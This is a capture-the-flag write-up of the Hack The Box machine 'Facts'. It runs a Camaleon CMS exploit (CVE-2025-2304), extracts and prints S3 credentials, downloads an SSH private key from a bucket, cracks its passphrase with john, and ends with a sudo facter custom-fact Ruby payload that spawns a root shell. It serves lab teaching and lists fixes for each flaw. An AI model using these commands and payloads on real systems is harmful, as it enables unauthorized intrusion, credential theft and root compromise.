## Summary

Facts is an Easy Linux machine running **Camaleon CMS**, vulnerable to an
authenticated privilege escalation (CVE-2025-2304). Exploiting it exposes AWS S3
credentials pointing at an internal S3-compatible service, where a private SSH
key is stored. The key (cracked with `john`) grants SSH access, and a sudo rule
on **facter** is abused to run arbitrary Ruby and escalate to **root**.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| Facts | Easy | Linux | Hack The Box |

## Attack Path

1. Nmap reveals HTTP and SSH.
2. Web enumeration identifies an admin panel.
3. The Camaleon CMS is exploited (CVE-2025-2304).
4. AWS S3 credentials are extracted.
5. A private SSH key is downloaded from an internal bucket.
6. SSH access is obtained.
7. sudo enumeration finds an allowed `facter` binary.
8. `facter` is abused to run Ruby and escalate to root.

## Reconnaissance

Initial enumeration was performed with **Nmap**.

```bash
nmap -sV -T5 -sC 10.129.19.58
```

| Port | Service | Notes |
| --- | --- | --- |
| 22 | SSH | OpenSSH 9.9p1 |
| 80 | HTTP | nginx (Ubuntu) |

## Web Enumeration

The web application on port 80 was a site named **Facts**. Content discovery
with Gobuster:

```bash
gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirb/common.txt
```

Findings:

- `/admin` redirects to `/admin/login`
- Hidden directories (`.git`, env-like files)
- Evidence of an administrative panel

## Exploitation — Camaleon CMS (CVE-2025-2304)

The application uses **Camaleon CMS v2.9.0**, vulnerable to an authenticated
privilege escalation (CVE-2025-2304).

```bash
python exploit.py -u http://facts.htb/ -U abc -P abc -e -r
```

This elevated privileges inside the CMS and exposed AWS S3 credentials:

```
Access Key: AKIA13F1EA8B94A4DE85
Secret Key: AiZzRMmU6R3jv2SYM6D5hLjifqmIGCio9L0g/R2r
Endpoint:   http://localhost:54321
```

## Initial Access (User)

Using the AWS CLI against the internal endpoint:

```bash
aws --endpoint-url http://facts.htb:54321 s3 ls
```

Two buckets were found (`internal`, `randomfacts`). Sensitive files were
downloaded from the `internal` bucket:

```bash
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_keys .
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
```

The private key passphrase was cracked offline:

```bash
ssh2john id_ed25519 > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
passphrase: dragonballz
```

SSH access was then obtained with the key:

```bash
ssh -i id_ed25519 trivia@10.129.19.58
```

The user flag lives at `/home/william/user.txt`.

## Privilege Escalation

### Enumeration

```bash
sudo -l
```

```
User trivia may run: /usr/bin/facter
```

### Abusing facter

`facter` loads custom facts, allowing arbitrary Ruby execution. A malicious fact
was created to spawn a privileged shell:

```ruby
# /tmp/pwn.rb
Facter.add(:pwn) do
  setcode { exec("/bin/bash -p") }
end
```

```bash
sudo facter --custom-dir=/tmp pwn
```

This spawned a shell as root. The root flag lives at `/root/root.txt`.

## Vulnerability Analysis

**Privilege escalation in Camaleon CMS (CVE-2025-2304)** — an authenticated flaw
allowed elevating privileges within the CMS and reading sensitive data,
including the AWS S3 credentials. Fix: upgrade Camaleon CMS and enforce strict
authorization on administrative actions.

**Insecure S3 exposure** — an internal S3 bucket was accessible and stored
`.ssh` private keys, turning credential disclosure into direct system access.
Fix: require authentication on the S3 service, restrict bucket policies, and
never store private keys in object storage.

**Misconfigured sudo (`facter`)** — `facter` could be run as root and executes
arbitrary Ruby through custom facts, giving full root. Fix: remove the sudo rule
and avoid granting sudo on interpreters or tools that load external code.

## Tools Used

- Nmap
- Gobuster
- AWS CLI
- John the Ripper
- SSH
- Python exploit
- Facter

## Key Takeaways

- Always fingerprint the CMS and version to find public exploits.
- Exposed credentials frequently cascade into full compromise.
- Misconfigured S3 buckets are critical when they hold keys or secrets.
- sudo on interpreted binaries (Ruby/Python) is an easy privesc path.
